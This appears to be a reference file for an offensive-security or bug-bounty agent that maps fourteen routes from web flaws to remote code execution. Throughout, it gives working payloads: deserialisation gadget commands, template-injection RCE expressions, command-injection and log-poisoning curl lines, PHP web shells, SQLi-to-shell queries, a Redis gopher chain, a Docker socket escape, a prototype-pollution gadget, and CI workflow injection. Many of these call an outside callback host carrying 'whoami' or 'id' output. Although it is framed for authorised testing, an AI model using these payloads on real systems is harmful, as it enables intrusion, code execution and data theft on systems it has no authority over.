# Moraa — RCE scenarios (every route from web finding to code execution)

> Load when chasing RCE — the top prize. This is the library's complete map of "how a web bug
> becomes code execution", organised by the vector you start from. For EACH vector below:
> the PRECONDITION you must already have, the concrete TEST, what PROVES execution, and the
> honest GATE (when the RCE claim is real versus a shrug). Confirm execution with an OOB
> callback or returned output — never assume it ([[controls-and-oracles]] is the proof
> discipline for every signal in this doc). Blind or borderline signals route to `validate.md`.

## The route map (ranked by real-world frequency)

```
 1. Command injection            → §3   (a feature shells out; fastest win)
 2. SSTI                          → §2   ({{7*7}} → engine → RCE)
 3. Insecure deserialization     → §1   (Java/PHP/.NET/pickle/Ruby/Node/YAML)
 4. File upload → web shell      → §4   (php/jsp/aspx in web-root; .htaccess; zip-slip)
 5. SQLi → OS/file               → §6   (xp_cmdshell, COPY TO PROGRAM, INTO OUTFILE, UDF)
 6. SSRF → internal RCE          → §9   (gopher→Redis, Docker socket, Kubelet, internal admin)
 7. Prototype pollution → gadget → §7   (server-side PP → Silent-Spring gadget)
 8. Known-CVE n-day              → §13  (fingerprinted stack → matching RCE CVE)
 9. LFI + log/session poison     → §5   (include a poisoned file → PHP exec)
10. XXE → RCE (rare)             → §8   (PHP expect://, XXE→SSRF→internal)
11. Supply-chain / dependency    → §10  (confusion, postinstall, build-time)
12. CI/CD pipeline RCE           → §11  (workflow injection, self-hosted runners)
13. Template/config injection    → §12  (Spring4Shell class-module data binding)
14. Parser/memory-safety at edge → §14  (image/PDF/WSDL parsers on exposed services)
```

Every route below follows the same discipline: **PROVE execution or drop the claim.** The
acceptable proofs are: an OOB callback carrying a marker you set (interactsh/Collaborator),
command output returned in a response (`id`/`whoami`/`hostname`), a file you wrote fetched back
by URL, or — weakest, last resort — a timing delta validated with proper controls
([[controls-and-oracles]] Case 5). Never run destructive commands on a bounty target: your PoC
vocabulary is `id`, `whoami`, `hostname`, `echo <marker>`, `curl your-oast`.

---

## §1. Deserialisation (the classic — every language has a killer)

**Precondition:** any endpoint that accepts an opaque serialised object: cookies/params that are
base64/hex blobs, `ViewState`, Java session blobs, signed request bodies, RPC/marshalling
endpoints, YAML/JSON config loaders that allow type tags.

**Per-language test + proof:**

| Runtime | Unsafe entry point | Test | Proof of execution |
|---|---|---|---|
| Java | `ObjectInputStream.readObject` | `ysoserial` gadget chain → base64 → cookie/body param: `java -jar ysoserial.jar CommonsCollections4 'curl https://YOU.oast.fun/j'` \| base64 -w0 | OOB callback; or DNS ping via `CommonsCollections`+`URLDNS` first to confirm readObject happens at all |
| .NET | `BinaryFormatter`, `LosFormatter`, `JsonConvert` with `TypeNameHandling.All/Auto`, `ObjectStateFormatter`/**ViewState** | `ysoserial.exe -g ObjectViewState -c 'curl ...'` (needs the `machineKey` — leak it via LFI/info-disclosure first, or find `enableViewStateMac=false`) | Callback; ViewState: modified `__VIEWSTATE` accepted + callback = machineKey recovered |
| Python | `pickle.loads`, `yaml.load` without `SafeLoader`, `marshal` | pickle payload: `\x80\x04\x95...\x8c\x04posix...system...curl OAST...` (generate with pickle + `__reduce__`) | Callback — pickle deserialises to arbitrary callable instantly |
| PHP | `unserialize()` on user input + a POP chain in the app's own classes (or phpggc's gadget chains for known frameworks) | `phpggc Laravel/RCE5 'curl https://YOU.oast.fun/j'` → base64 → cookie/param; phar:// wrapper makes ANY file op an unserialise (`file_exists('phar://upload.png')`) | Callback |
| Ruby | `Marshal.load` on user input + universal RCE gadgets (`Gem::SpecFetch`, `Net::WriteAdapter` chains) | marshal payload via universal_rce_gadget generator → cookie | Callback |
| Node | `node-serialize`/`serialize-javascript` round-trips, `func-value` injection `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl OAST')}()"}` | post the serialised blob to the endpoint that unserialises | Callback. (Related: apps that `eval`/`new Function` serialized-javascript output — same proof) |
| YAML | `yaml.load()` (PyYAML `!!python/object` tags), Ruby `YAML.load` older defaults, JS `js-yaml` `DEFAULT_SCHEMA` | `!!python/object/apply:os.system ["curl https://YOU.oast.fun"]` in any YAML body/param | Callback |

**Verified n-days in this class (confirmed against NVD):**
- **CVE-2025-55182** — React Server Components **19.0.0 / 19.1.0 / 19.1.1 / 19.2.0** (packages
  `react-server-dom-parcel`, `react-server-dom-turbopack`, `react-server-dom-webpack`): the
  Flight/Server-Functions payload deserialiser unsafely deserialises HTTP request payloads →
  **pre-auth RCE** (NVD description verbatim; Next.js Server Functions ship the same packages).
  Public template exists (`nuclei -tags cve2025,rce -id CVE-2025-55182`) and fingerprints with a
  math-callback trick — run it before hand-exploiting. Any Next.js/React 19 host that hasn't
  patched → this is the first thing to test.
- **CVE-2026-9330** — IBM WebSphere Application Server **8.5 / 9.0**, SAML Web SSO component:
  improper validation of user-supplied data during deserialisation → RCE "when combined with a
  suitable gadget chain" (NVD, CVSS 8.5 `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`). Any WebSphere
  host with the SAML TAI enabled: send a crafted SAML response, watch for the deserialisation
  path.

**Gate:** an unserialise that only errors (no callback) = the endpoint parses blobs but you have
no gadget — say "deserialisation surface present, no gadget confirmed", not RCE. URLDNS/DNS-only
callback proves *reaching* readObject, not RCE — keep the severity honest until an exec gadget
fires. → [[deserialization]]

---

## §2. SSTI per engine → RCE

**Precondition:** user input reaches a template *render* (emails, PDFs, name fields re-rendered
on profile pages, error pages echoing input, CMS themes, marketing-mail templating).

```bash
# detect (fired together — each engine's math marker):
# {{7*7}}=49 Jinja2/Twig | ${7*7}=49 Freemarker/Velocity/Mako | <%= 7*7 %>=49 ERB/EJS
# #{7*7}=49 Ruby/Thymeleaf | *{7*7}=49 Thymeleaf | {7*7}=49 Smarty
curl -sk "https://T/page?name=%7B%7B7*7%7D%7D" | grep 49
```

**Engine → RCE (standard public payloads; confirm on the target, engines differ by version):**

| Engine | RCE expression |
|---|---|
| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('curl https://YOU.oast.fun/j').read()}}` |
| Twig | `{{['curl https://YOU.oast.fun/j']\|filter('system')}}` |
| Smarty (PHP) | `{system('curl https://YOU.oast.fun/j')}` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://YOU.oast.fun/j")}` |
| Velocity | `#set($s=$class.inspect("java.lang.Runtime").type.getRuntime().exec("curl https://YOU.oast.fun"))` (blind — pair with OAST) |
| Mako | `${__import__("os").popen("curl https://YOU.oast.fun/j").read()}` |
| ERB (Ruby) | `<%= system("curl https://YOU.oast.fun/j") %>` |
| Thymeleaf | `__${T(java.lang.Runtime).getRuntime().exec("curl https://YOU.oast.fun")}__::.x` (as a fragment/view name) |

**Proof:** marker `49` confirms *evaluation*; execution is proven ONLY by the callback or
returned command output. **Gate:** `49` with no exec primitive = template *evaluation*, still
reportable (info/low "SSTI evaluation, no confirmed RCE") — don't claim RCE on math alone.
→ [[ssti]]

---

## §3. Command injection + argument injection

**Precondition:** a feature that shells out: ping/traceroute/export tools, PDF/convert options,
archive names, hostname/IP/URL fields, git/SSH URL params, webhook shell-outs, image/video
processing.

```bash
# separators (fired as a set): ; | & && || `cmd` $(cmd) %0a %0d {cmd,arg}
curl -sk "https://T/tools/ping?host=127.0.0.1;curl%20https://YOU.oast.fun/$(whoami)"
# blind/time:
curl -sk "https://T/tools/ping?host=127.0.0.1%0asleep%205" -w '%{time_total}\n'   # ~5s delta
# argument injection — no separator needed, you control a FLAG of an existing binary:
#   tar --checkpoint-action=exec=  |  git -c core.sshCommand=  |  curl -o /path  |
#   ffmpeg -i x -proxy  |  scp -o ProxyCommand=  |  zip --unzip-command
curl -sk "https://T/export?format=pdf&args=--proxy%20https://YOU.oast.fun"
```

**Proof:** OOB callback with `$(whoami)` embedded in the URL, or output reflected. Timing
(`/sleep 5`) is supporting evidence only — validate the noise floor ([[controls-and-oracles]]).
**Gate:** argument injection that only makes the tool print help = a note; it pays when the
flag leads to read (curl `-o` writing webroot), exec (`--checkpoint-action`, `ProxyCommand`), or
OOB exfil. Where to look in source: `system/exec/popen/shell_exec/proc_open` (PHP),
`os.system/subprocess shell=True` (Py), `Runtime.exec/ProcessBuilder` (Java),
`child_process.exec` (Node), backticks/``system`` (Ruby). → [[command-injection]]

---

## §4. File upload → RCE

**Precondition:** any upload surface (avatar, import, attachment, theme/plugin installer, API
`multipart`).

| Vector | Test | Proof |
|---|---|---|
| Web shell in web root | upload `shell.php/jsp/aspx` (also `.phtml`, `.php5`, `.phar`, `.shtml`, `shell.php%00.gif`-style null/unicode tricks, `.asp;.jpg` IIS semicolon) | `GET /uploads/shell.php?c=id` → `uid=...` in body |
| Double extension + mime confusion | `shell.php.jpg` where the server routes by extension OR Apache `AddHandler` misconfig executes `.php.*` | same fetch-back |
| `.htaccess` / `web.config` overwrite | upload `.htaccess` with `AddType application/x-httpd-php .png` (Apache + AllowOverride), or `web.config` handler for `.png` | upload `rce.png` with PHP code → fetch-back executes |
| SVG → XSS first, SSRF/XXE second | `<svg><script>...</script></svg>` served with `image/svg+xml` from the same origin | script fires in YOUR browser session on the origin (beacon) |
| zip-slip | import/archive feature; craft entry `../../../../var/www/html/s.php` (symlink trick for tars) | file exists at traversed path, fetched back |
| Path traversal in filename | `filename="../../../var/www/html/proof.txt"` on a plain upload | fetched-back marker outside the upload dir |

**Gate:** a write that stays inside the upload sandbox and never executes = no RCE (report the
filter weakness at low/info). Fetch-back + execution output is the only RCE proof. Mind the
cleanup duty: shells on a bounty target should be a minimal `echo marker`/`id` dropper, deleted
after capture. → [[file-upload]]

---

## §5. LFI → RCE

**Precondition:** a file path you control reaches an include/read (`?file=`, config loaders,
language-file params, export templates).

```bash
# read first (confirm the primitive):
curl -sk "https://T/page?file=../../../../etc/passwd"
curl -sk "https://T/page?file=php://filter/convert.base64-encode/resource=index.php"
# to RCE — you need a file you can INFLUENCE that the app will later include/execute:
#  1. log poisoning: inject <?php system($_GET[c]);?> via UA into access/error log, then include it
#    curl -sk "https://T/" -A '<?php system($_GET[c]);?>'
#    curl -sk "https://T/page?file=../../../../var/log/nginx/access.log&c=id"
#  2. PHP session files: /tmp/sess_<PHPSESSID> — inject into a session-stored field, include it
#  3. /proc/self/environ — UA lands here on some CGI setups; include it
#  4. php://filter CHAIN to RCE on plain `include` (no upload needed): the oracle/oracle-filter
#     chain synthesises arbitrary file CONTENT from filter rotations (synacktiv's generator)
#  5. data:// (allow_url_include), php://input, expect:// (§8), phar:// (§1 PHP)
```

**Proof:** command output in the response after including the poisoned file, or the filter-chain
payload's callback. **Gate:** LFI that reads `/etc/passwd` but no include-exec path = the LFI
finding (data exposure severity) — RCE only when a poisoned/influenced file is actually included
and executes. → [[lfi]]

---

## §6. SQLi → RCE

**Precondition:** confirmed SQLi (§ per [[sqli]]) + one of the privilege/feature gates below.
Stacked queries NOT required for the MySQL/Postgres file routes; required for most MSSQL exec
routes.

| Route | Engine/privilege | Test | Proof |
|---|---|---|---|
| `INTO OUTFILE` / `LOAD_FILE` | MySQL, `FILE` privilege, `secure_file_priv` permits, web-root path known | `' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/x.php'-- -` | `GET /x.php?c=id` → `uid=...` |
| UDF (sys_exec) | MySQL + FILE + plugin dir writable (rare, legacy) | create `lib_mysqludf_sys` from written .so | `SELECT sys_exec('curl OAST')` → callback |
| `xp_cmdshell` | MSSQL sysadmin (often disabled — enabling needs the same privilege: try `sp_configure`) | `'; EXEC xp_cmdshell 'curl https://YOU.oast.fun'-- -` | callback |
| `COPY ... TO PROGRAM` | Postgres superuser | `'; COPY (SELECT '') TO PROGRAM 'curl https://YOU.oast.fun'-- -` | callback |
| Linked servers | MSSQL + `sys.servers` rows | `'; EXEC (''select @@version'') AT [LINKED];'` / relay `xp_cmdshell` to the linked instance | callback from the LINKED host (scope check first!) |

**Gate:** every route needs its privilege — prove the privilege with the SAME injection
(e.g. `LOAD_FILE('/etc/passwd')` returning data proves FILE). Without privilege, the SQLi is the
finding at its data-access severity; say "RCE routes closed: FILE/sysadmin privilege absent"
rather than implying otherwise. → [[sqli]]

---

## §7. Prototype pollution → RCE (Silent Spring gadgets)

**Precondition:** server-side PP sink confirmed — merge/deep-clone/`Object.assign`-style
recursion or `qs`/body-parser config that honours `__proto__`/`constructor.prototype`.

**Gadget classes** (from "Silent Spring: Prototype Pollution Leads to RCE in Node.js", USENIX
Security 2023, Shcherbakov et al. — 11 universal gadgets identified in Node.js source code and
8 RCEs demonstrated in real-world applications):

1. **Child-process hijack via polluted `shell`** — any later `child_process.exec`/`spawn` call
   with default options picks up `shell: "/bin/sh"`-equivalent from the polluted prototype →
   your string is parsed by a shell you shape.
2. **`env` hijack** — polluted `env`/`PATH` redirects the spawned process to an attacker-named
   binary (works when spawn uses default environment handling).
3. **Template-engine gadgets** — EJS reads template options off the prototype:
   `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('curl https://YOU.oast.fun/$(id|base64 -w0)');//"}}`,
   then trigger ANY render.
4. (Weaker but reportable) authz/bypass gadgets — polluted flags that skip checks; severity =
   whatever the bypassed check guarded.

```bash
curl -sk -X PUT "https://T/api/profile" -H "Cookie: <A-SESSION>" \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require('"'"'child_process'"'"').execSync('"'"'curl https://YOU.oast.fun/$(id|base64 -w0)'"'"');//"}}'
curl -sk "https://T/render" -H "Cookie: <A-SESSION>"    # any render fires the gadget
# listener: GET /uid=0(www-data)... (base64) → RCE PROVEN
```

**Proof:** the exec callback. **Gate:** PP with no reachable gadget in the runtime = the
[[prototype-pollution]] finding at its own (usually low) severity; "Silent Spring says gadgets
exist" is not proof a gadget exists HERE — hunt `child_process` calls and render engines in the
bundled/leaked source ([[js-analysis]]) before claiming it.

---

## §8. XXE → RCE

**Precondition:** XML accepted (body, SOAP, DOCX/XLSX/SVG upload, SAML) and external entities
not fully blocked.

```bash
# RCE via PHP wrappers (PHP handler, expect extension present — rare but real):
<!ENTITY xxe SYSTEM "expect://id">              # → <response>&xxe;</response> returns uid=
# file-read first if exec wrappers fail (file-read itself is High):
<!ENTITY xxe SYSTEM "file:///etc/passwd">
# XXE→SSRF→internal RCE: entity = gopher://127.0.0.1:6379/... (§9) or internal admin
```

**Proof:** returned output (`uid=`), or OOB via the external DTD (blind XXE confirms parse,
NOT RCE). **Gate:** blind OOB callback = XXE SSRF/file-read class finding; RCE only via a real
exec wrapper (expect://) or a chained internal service compromise. → [[xxe]], [[ssrf]]

---

## §9. SSRF → RCE (internal services)

**Precondition:** SSRF primitive (full-response or blind) reaching internal space
([[ssrf]] for the filter-bypass tables).

| Internal target | Why it executes | Test |
|---|---|---|
| Redis (6379, unauth) | `CONFIG SET dir /var/www/html` + `SET shell.php ...` + `SAVE` = webshell; or crontab/ssh-key write | `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...` (CRLF-encoded command chain) → fetch the webshell |
| Docker socket (`/var/run/docker.sock`, 2375) | create+start a container mounting `/` | SSRF that can hit unix sockets or the TCP port: `POST /containers/create` with `"Binds":["/:/host"]` → exec → host root |
| Kubelet (10250) | `exec`/`run` API on nodes; anonymous auth on some setups | `POST /run/<ns>/<pod>/<container>` → command output |
| Internal admin (Jenkins, actuator, Spring console, job runners) | script consoles = exec | actuator/jolokia chain, Jenkins script console (if creds/implanted), Flask Werkzeug `/console` (PIN calc from LFI'd /proc) |

**Proof:** exec output via the internal service's own response, or the callback from the
written webshell. **Gate:** internal 200s/probes ≠ RCE — the chain closes only when a command
runs on SOME host (container or VM); report the pivot's blast radius honestly
([[cloud]]/[[k8s]] for what the foothold reaches).

---

## §10. Dependency / supply-chain RCE

**Precondition:** you can influence what the target INSTALLS or BUILDS: internal package names
guessable, a package registry you can publish to, CI config you can edit, or a lockfile that
mixes registries.

| Vector | Test | Proof |
|---|---|---|
| Dependency confusion | internal-only package name leaked (bundle, lockfile, error message) → publish a higher version to the PUBLIC registry with a `postinstall` that beacons to YOUR collector (revocable, no damage) | your collector receives the install beacon from the target's CI/dev network — report immediately, unpublish |
| Build-time script injection | `npm prepare`/`postinstall` in a dependency the target publishes or a template repo they copy | same beacon |
| Registry/CI credential theft → publish | leaked npm/PyPI token (§12 info-disclosure chain) → publish trojanised version of THEIR package | downstream beacon |

**Proof:** the install/build beacon from inside the target's infrastructure (timestamp + IP for
the report). **Gate:** a beacon during an authorised engagement window = critical; anything
after the window or touching third parties = stop. This class is engagement-dependent — check
program scope on *their supply chain* first. → [[supply-chain]]

---

## §11. CI/CD RCE

**Precondition:** a pipeline that builds your input: PR title/branch into `${{ }}` interpolation,
a test command echoing your input, a self-hosted runner attached to a public-repo workflow, or
exposed Jenkins/GitLab job config you can trigger.

| Vector | Test | Proof |
|---|---|---|
| Workflow injection (GitHub Actions) | `title: a"; curl https://YOU.oast.fun/$(id\|base64);#` on a PR to a repo whose workflow interpolates `${{ github.event.pull_request.title }}` inside `run:` | callback from the runner |
| Self-hosted runner | repo has a `[self-hosted]` label visible in workflow logs/badges; open a PR that triggers the workflow | the PR's job executes ON THEIR RUNNER — command output in the job log you can read |
| Exposed Jenkins/GitLab CI | script console / job DSL / pipeline editor reachable with leaked creds (§12 chain) | job output shows exec |

**Proof:** callback or job-log output. **Gate:** interpolated-but-not-interpreted input (plain
string in logs) = info. Runner compromise = drop everything else and report — it is usually
repo-write equivalent. → [[cicd-attack]]

---

## §12. Template / config injection (framework data binding)

**Precondition:** a framework that auto-binds request params onto internal objects (JavaBean
property binding, mass assignment on server config), typically exposed via form/JSON endpoints.

**Spring4Shell — CVE-2022-22965 (NVD-confirmed details):** Spring MVC **or WebFlux** on
**JDK 9+** — RCE via data binding (`class.module.classLoader...` write to
`AccessLogValve`'s directory/pattern/suffix). NVD states the specific exploit **requires Tomcat
deployed as a WAR**; a **Spring Boot executable jar** (the default) is NOT exploitable this way,
though "the nature of the vulnerability is more general, and there may be other ways to exploit
it". NVD: CVSS 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`), published 2022-04-01.

```bash
# precondition triage BEFORE the payload: JDK9+ + Tomcat + WAR + Spring ≤5.2.19/5.3.17 class stack
curl -sk "https://T/path" -d "class.module.classLoader.URLs[0]=x&class.module.classLoader.defaultAssertionStatus=x"
# exploit writes an access-log JSP (PoC commands only):
#   class.module.classLoader.resources.context.parent.pipeline.first.pattern=<jsp payload>
# proof: GET the written .jsp → id output. Fixed in Spring 5.3.18/5.2.20 (and Tomcat 10.0.20/9.0.62/8.5.78).
```

**Proof:** the written JSP fetched back returning `id` output. **Gate:** binding *succeeds* but
the valve write is blocked (Boot jar, patched) = not exploitable — report as "classLoader
binding accepted, RCE preconditions absent" info only. Related same-family checks: SpEL
injection (`${7*7}`/`T(java.lang.Runtime)`), Struts OGNL, Django/Python format-string in admin
templates. → [[framework-misconfig]]

---

## §13. Known-CVE n-day (fingerprint → exploit)

```
nuclei -u https://T -tags cve,rce -severity critical,high     # then confirm EVERY hit manually
# match the fingerprinted stack (recon.md / js-analysis.md) to the matching RCE:
#  Spring (SpEL/Cloud/Actuator), Struts2 OGNL, Confluence/Jira, GitLab, Jenkins,
#  Log4Shell (jndi:ldap — probe ${jndi:ldap://OAST/x} into EVERY header/field), Next.js/Node
#  middleware (CVE-2025-55182 §1, CVE-2025-29927 middleware bypass), WordPress/Joomla plugins,
#  Telerik, Fortinet/Citrix, Atlassian, PHP CGI, ThinkPHP, phpMyAdmin, ImageMagick/Ghostscript.
```

**SOAPwn — .NET `HttpWebClientProtocol`/WSDL RCE** (Piotr Bazydło/watchtowr, 2025-26): an unfixed
(Microsoft declined to patch) flaw across multiple .NET products that expose a WSDL-consuming
endpoint — a crafted WSDL document processed via `HttpWebClientProtocol` can achieve RCE. Fingerprint:
any .NET target accepting a WSDL URL/upload (SOAP client generators, "import WSDL" admin features).
Niche surface but worth checking on any .NET/SOAP-heavy target since it stays unpatched at the
platform level. Whitepaper: https://watchtowr.com/wp-content/uploads/SOAPwnwatchtowr_soappwn-research-whitepaper_10-12-2025.pdf

**Proof:** the template's own callback/marker, then a hand replay for the evidence chain.
**Gate:** a version string in a banner is not a vulnerability — the template match (or hand
request/response) is. Tracker policy: every n-day claim cites the CVE, and the CVE's NVD entry
must be checked for the EXACT preconditions (see Spring4Shell above — "affected" ≠ "exploitable
on your target's deploy mode"). → [[framework-misconfig]], [[cms-wordpress-joomla]]

---

## §14. Memory-safety / parser RCE at the edge

**Precondition:** an exposed service parses complex binary/formats: image processors
(ImageMagick/Ghostscript — SVG/MVG/polyglot images), PDF generators, archive expanders, VPN/web
appliances' own parsers, WSDL/SOAP processors (§13 SOAPwn).

```
ImageMagick:  CVE-class ImageTragick (MVG delegates) + -dSAFER bypasses on Ghostscript —
              upload a polyglot (GIF+MVG) to any image-processing endpoint
PDF/PS:       Ghostscript through a "convert to PDF" feature
Appliances:   pre-auth parser bugs on VPN/firewall appliances → enterprise-vpn-attack.md CVE matrix
```

**Proof:** callback from the parser (delegates/OAST). **Gate:** black-box web hunting usually
stops at "upload accepted by the parser" — memory-corruption exploitation is out of scope for
bounty reports; the finding is the *reachable unpatched parser*, proven by version fingerprint +
a safe delegate/OOB payload if available. Native-exploitation depth:
`knowledge/offensive/offensive-exploit-development.md`.

---

## Method

1. Identify which routes the app actually exposes (a shell-out feature? a template? an upload?
   a deserializer? a vulnerable component? an internal service behind SSRF?) — usually 1-3 of
   the 14 are even possible.
2. Confirm safely: OAST/DNS callback or `id`/`whoami`/`hostname`/`echo marker` — **never** a
   destructive command, never persistence, never pivoting on a bounty target.
3. Every proof obeys [[controls-and-oracles]]: OOB payloads must be pollable by YOU (minted
   from your own Collaborator/interactsh client), timing claims get a noise floor, a "written"
   file gets fetched back.
4. Minimal PoC only. → `validate.md` → `findings/` (command output or OAST hit attached).
5. A confirmed RCE on an in-scope host is a foothold — for pentest engagements switch to
   [[initial-access]]; for bug bounty, stop and report.
